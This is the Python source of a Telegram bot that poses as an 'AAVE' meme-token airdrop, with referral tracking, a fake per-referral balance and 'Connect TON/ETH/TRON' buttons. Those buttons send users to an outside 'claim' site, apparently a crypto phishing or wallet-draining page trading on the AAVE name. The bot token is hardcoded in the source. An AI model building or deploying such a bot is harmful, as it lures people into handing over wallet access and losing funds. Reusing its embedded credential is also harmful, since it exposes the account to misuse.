from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_referred_users
import logging

# Set up logging to print debug information
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to show the main menu
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Check Wallet", callback_data='check_wallet'), InlineKeyboardButton("My Referral Link", callback_data='generate_referral')],
        [InlineKeyboardButton("Referral List", callback_data='referral_list'), InlineKeyboardButton("Join Community", url="https://t.me/JoinAave")],
        [InlineKeyboardButton("Connect TON", callback_data='connect_ton'), InlineKeyboardButton("Connect ETH", callback_data='connect_eth')],
        [InlineKeyboardButton("Connect TRON", callback_data='connect_tron')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=(
            "AAVE is here! Your simple and fun Telegram meme token.\n\n"
            "Get started with our AAVE Telegram mini app to farm points and unlock exciting rewards. 🎁\n\n"
            "Got friends? Invite them and earn even more! 🌱\n\n"
            "Don’t miss out—AAVE is where your crypto journey grows! 🌟"
        ),
        reply_markup=reply_markup
    )

# Function to handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username

    logger.info(f"User {user_id} started the bot with username: {username}")

    add_or_update_user(user_id, username)
    await show_main_menu(update, context)

# Function to handle button clicks
async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback
    user_id = update.effective_user.id

    if query.data == 'check_wallet':
        # Show wallet balance based on referrals
        user_data = get_user_data(user_id)
        referrals = user_data['referrals']
        balance = referrals * 22  # Assuming 22 $AAVE per referral
        await query.edit_message_text(
            text=f"Your current balance is {balance} $AAVE from {referrals} referrals.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("<< Back", callback_data='back')]])
        )
        logger.info(f"Checked wallet for user {user_id}. Referrals: {referrals}, Balance: {balance}.")

    elif query.data == 'generate_referral':
        # Show user's referral link
        username = update.effective_user.username or str(user_id)
        referral_link = f"https://t.me/AAVEclaim_bot?start=referral_{username}"
        await query.edit_message_text(
            text=f"Your referral link is: {referral_link}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("<< Back", callback_data='back')]])
        )
        logger.info(f"Sent referral link to user {user_id}: {referral_link}.")

    elif query.data == 'referral_list':
        # Show list of referred users
        referred_users = get_referred_users(user_id)
        total_referred = len(referred_users)
        referred_users_list = "\n".join([f"- {user}" for user in referred_users]) or "No referred users yet."
        await query.edit_message_text(
            text=f"Total Referred: {total_referred}\n\nReferred Users:\n{referred_users_list}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("<< Back", callback_data='back')]])
        )
        logger.info(f"Sent referred users list to user {user_id}.")

    elif query.data.startswith('connect_'):
        # Handle connection to TON, ETH, TRON
        platform = query.data.split('_')[1].upper()
        await query.edit_message_text(
            text=f"Connecting to {platform}...",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("<< Back", callback_data='back')]])
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Redirecting to the connection page...")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="https://aavetoks-claim.site")
        logger.info(f"User {user_id} requested to connect to {platform}.")

    elif query.data == 'back':
        # Go back to the main menu
        await show_main_menu(update, context)

# Function to log unhandled messages
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"Unhandled message received: {update}")

def main():
    application = ApplicationBuilder().token("7212377554:AAEQhO0o3djcL03N_vCtlwD48IBrLK-2yIg").build()

    init_db()

    # Add custom menu buttons
    application.bot.set_my_commands([
        BotCommand("start", "Start the bot")
    ])

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_click_handler))

    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
